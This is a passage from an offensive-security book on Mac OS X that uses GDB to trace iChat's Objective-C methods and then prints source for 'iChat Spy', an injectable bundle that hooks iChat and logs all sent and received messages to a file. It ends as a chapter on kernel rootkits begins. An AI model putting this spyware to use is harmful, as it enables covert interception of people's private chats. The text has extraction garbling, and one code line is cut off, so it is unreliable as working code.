$1 = (void *) 0x261b60
(gdb) call (void*)sel_getUid(“sendMessage:toChatID:”)
$2 = (void *) 0x1e85b5
(gdb) call (void *)class_getInstanceMethod($1, $2)
$3 = (void *) 0x106a534
gdb) x/3x $3
0x106a534: 0x001e85b5 0x001e74e0 0x000988fb
(gdb)
So far in this example you have used the Objective-C runtime’s own func-
tions to look up the class and method that you are interested in. After call-
ing class_getInstanceMethod(), you are given an IMP pointer for the method’s
9955336633cc1111..iinndddd 332200 11//2255//0099 44::4433::0044 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 321
implementation. The fi rst element in this structure should match the selector
for the method returned by sel_getUid(). The third element is a pointer to the
method’s actual implementation in code.
(gdb) x/8i 0x000988fb
0x988fb: push ebp
0x988fc: mov ebp,esp
0x988fe: sub esp,0xa8
0x98904: mov DWORD PTR [ebp-0xc],ebx
0x98907: lea ebx,[ebp-0x70]
0x9890a: mov DWORD PTR [ebp-0x8],esi
0x9890d: mov DWORD PTR [ebp-0x4],edi
0x98910: mov DWORD PTR [ebp-0x80],0x0
You can now set a breakpoint on it and observe when it is called and what its
arguments are. You can set a breakpoint right after the frame pointer and stack
pointer are set so that you can examine the method’s arguments relative to the
frame pointer, just like they are displayed in IDA Pro. The Objective-C runtime
passes two implicit arguments to each method. The object’s self pointer is the
fi rst implicit argument and it is stored as an Objective-C object at $ebp+8. The
method selector is the second implicit argument, and it is stored as a C-string
at $ebp+12. The fi rst explicit method argument is available at $ebp+16 and the
rest follow from there. From the breakpoint, you can examine the Objective-C
object arguments using the GDB command “print-object” or “po” for short.
(gdb) break *0x98904
Breakpoint 1 at 0x98904
(gdb) cont
Continuing.
Breakpoint 1, 0x00098904 in ?? ()
(gdb) x /x $ebp+8
0xbfffec30: 0x008c6f30
gdb) x /x $ebp+12
0xbfffec34: 0x001e85b5
(gdb) x/s 0x001e85b5
0x1e85b5: “sendMessage:toChatID:”
(gdb) po 0x008c6f30
Previous frame inner to this frame (gdb could not unwind past this
frame)
Service[AIM]
gdb) x/x $ebp+16
0xbfffec38: 0x188185a0
(gdb) po 0x188185a0
Previous frame inner to this frame (gdb could not unwind past this
frame)
(gdb) x/x $ebp+20
9955336633cc1111..iinndddd 332211 11//2255//0099 44::4433::0044 PPMM
322 Part IV ■ Post-Exploitation
0xbfffec3c: 0x00818a10
(gdb) po 0x00818a10
Previous frame inner to this frame (gdb could not unwind past this
frame)
-dinodaizovi***3FFD4E63-3DCD-453A-A6B4-30A67E49898B
You can see that fi rst argument is an object of type FZMessage. The second
argument is an NSString and it has a strange format. iChat precedes special-
purpose strings with a dash (-) internally and this string uniquely identifi es
a chat session. Its format is -***. You could use your
understanding of this format to track logged iChats by grouping them by recipi-
ent and conversation.
Now that you know which methods you want to swizzle, you need to prepare
some fake headers for them using class-dump. Using the –H option to class-
dump will generate header fi les for a chosen class:
% class-dump -H -C Service /Applications/iChat.app/Contents/MacOS/iChat
To perform the actual swizzling, you can use another package from Jonathan
“Wolf” Rentzsch, JRSwizzle (http://rentzsch.com/trac/wiki/JRSwizzle).
There are several different specifi c mechanisms that can be used for Objective-C
method swizzling and different methods need to be used for different combina-
tions of the Objective-C runtime, host architecture, and whether the method
is implemented directly in the chosen class or if it is inherited. JRSwizzle “just
works,” regardless of the combination of those factors.
JRSwizzle adds the method jr_swizzleMethod to NSObject. To use it, you need
to declare a category that adds some new methods to an existing class. These
new hook methods are the swizzled versions of the target methods. They must
take the same type of arguments, but their selectors must be different so that
you may differentiate them. When you call jr_swizzleMethod, it will swap the
implementation of the real methods with the hook methods. If the hook methods
call themselves, they will actually call the original methods.
This is somewhat confusing, but it is best demonstrated by example, as shown
in the next section.
Example: iChat Spy
The next example is an injectable bundle to spy on iChats. This bundle will log
all IMs sent to and received by /tmp/ichatspy. It may be found in this book’s
source-code package in lib/bundles/ichat.
To perform method swizzling, we declare a new category iChatSpy for the
Service class that contains the hook methods. To differentiate them from the
original versions, we prefi x each method selector with “Swizzle.” In the bundle
initialization function, sslspy_init(), we make the calls jr_swizzleMethod to
perform the method swizzling.
9955336633cc1111..iinndddd 332222 11//2255//0099 44::4433::0044 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 323
/**********************************************************************
* NAME
*
* ichatspy -- An injectable bundle to capture and log iChats
*
* SYNOPSIS
* inject-bundle ichatspy 
* inject-bundle ichatspy  [  ... ]
*
* DESCRIPTION
* This bundle is meant to be injected into a running or newly
* launched process by inject-bundle. It will capture and log
* all chat messages sent or received through iChat to
* /tmp/ichatspy.
*
**********************************************************************/
#import “iChat/Service.h”
#import “iChat/FZMessage.h”
#import “JRSwizzle.h”
static FILE* _logfile = NULL;
static NSString* _getChatPeer(NSString* chat)
{
NSArray* parts = [chat componentsSeparatedByString:@”***”];
NSString* nickname = [[parts objectAtIndex:0] substringFromIndex:1];
return nickname;
}
/**********************************************************************
* iChatSpy *
**********************************************************************/
@interface Service (iChatSpy)
- (oneway void)swizzleInvitedToChat:(NSString *)chat
isChatRoom:(BOOL)isRoom
invitation:(FZMessage *)invite;
- (oneway void)swizzleChat:(NSString *)chat
messageReceived:(FZMessage*)message;
- (oneway void)swizzleSendMessage:(FZMessage*)message
toChatID:(NSString*)chat;
@end
9955336633cc1111..iinndddd 332233 11//2255//0099 44::4433::0044 PPMM
324 Part IV ■ Post-Exploitation
@implementation Service (iChatSpy)
- (oneway void)swizzleInvitedToChat:(NSString *)chat
isChatRoom:(BOOL)isRoom
invitation:(FZMessage *)invite
{
fprintf(_logfile, “%s -> %s\n”,
[_getChatPeer(chat) UTF8String],
[[invite body] UTF8String]);
return [self swizzleInvitedToChat:chat isChatRoom:isRoom
invitation:invite];
}
- (oneway void)swizzleChat:(NSString *)chat
messageReceived:(FZMessage*)message
{
fprintf(_logfile, “%s -> %s\n”,
[_getChatPeer(chat) UTF8String],
[[message body] UTF8String]);
return [self swizzleChat:chat messageReceived:message];
}
- (oneway void)swizzleSendMessage:(FZMessage*)message
toChatID:(NSString*)chat
{
fprintf(_logfile, “%s  Say cheese
dinodaizovi 
dinodaizovi -> 
dinodaizovi 
Cheese
dinodaizovi -> 
Cheese
Conclusion
The bundles and tools in this chapter demonstrate a number of extremely useful
techniques for security attacks and testing: bundle injection, function hooking,
and Objective-C method swizzling. These techniques allow you to implement
mission logic in high-level C or Objective-C using any of the facilities or frame-
works provided by Mac OS X.
References
Rentzch, Jonathan, “Wolf”. “Dynamically Overriding Mac OS X,” http://
rentzsch.com/papers/overridingMacOSX
Rentzch, Jonathan, “Wolf”. mach_star, http://rentzsch.com/mach_star/
Omernick, Tim. CocoaSequenceGrabber, http://www.skyfell.org/
cocoasequencegrabber.html
Technical Note TN2124: Mac OS X Debugging Magic, http://developer
.apple.com/technotes/tn2004/tn2124.html
Rentzsch, Jonathan, “Wolf”. JRSwizzle, http://rentzsch.com/trac/
wiki/JRSwizzle
9955336633cc1111..iinndddd 332266 11//2255//0099 44::4433::0044 PPMM
CHAPTER
12
Rootkits
OK, you got root; now what? So far, this book has discussed how to fi nd vul-
nerabilities in computers running Mac OS X and how to exploit these holes to
run code of your choosing. The last couple of chapters detailed some interest-
ing payloads to run on victims’ computers. In this fi nal chapter we move from
controlling the user space to controlling the entire operating system by running
code in the kernel. Code running within the kernel has no restrictions and can
make fundamental changes to the way the operating system behaves. This allows
the attacker to hide fi les, processes, and network connections from the normal
system-administration tools. This ability makes discovering the compromise
extremely diffi cult and makes cleaning up from the attack even more diffi cult.
Kernel Extensions
Rootkits are pieces of code that allow an attacker to hide their presence from
the victim. They can hide fi les, processes, and network connections. They often
come with modules that provide persistent access (backdoor) and network and
keyboard sniffers. Most of these activities can be done, in one form or another, by
user-space programs. Early rootkits simply modifi ed programs like ls to change
their output to suit the attacker. Such rootkits are easily discovered, and more
advanced versions, like the ones outlined in this chapter, rely on running code
in the kernel to change the fundamentals of the operating system itself.
327
9955336633cc1122..iinndddd 332277 11//2255//0099 44::4433::2200 PPMM
328 Part IV ■ Post-Exploitation
Kernel extensions allow dynamic kernel-level code to be added to the running
Mac OS X kernel. Whereas user-space applications can communicate with the
kernel only through very well-defi ned and regulated interfaces, such as system
calls, kernel extensions have full access to the functions, variables, and data
structures present in the kernel. They have the ability to add functionality to
the kernel or fundamentally change the way the kernel operates.
Like most kernels, the Mac OS X kernel is modular and allows the dynamic
addition and removal of new code when needed. Most often, this is done in the
case of device drivers, special kernel code needed for particular physical (and
virtual) devices. These device drivers are loaded automatically by the kernel
when needed, or may be loaded manually by a privileged user. In Mac OS X
parlance, kernel extensions are called kexts. These kexts are loaded by the user-
space daemon kextd.
In the next section you will build a simple kext using Xcode, and we will
discuss it and create some more interesting examples.
Hello Kernel
Start up Xcode and choose New Project. Select Kernel Extension and then choose
the Generic Kernel Extension. The other choice, IOKit driver, will be discussed
later in the chapter. The main difference is that generic kernel extensions are
easier to set up and are written in C, while IOKit drivers are written in C++.
Both can perform the exact same actions—namely, anything. Next choose a
name for the project, like hello-kernel, and press Save to bring up the main
Xcode GUI; see Figure 12-1.
Figure 12-1: The Xcode GUI for building kernel extensions
9955336633cc1122..iinndddd 332288 11//2255//0099 44::4433::2200 PPMM
Chapter 12 ■ Rootkits 329
Add a print statement in both the start and stop functions. These functions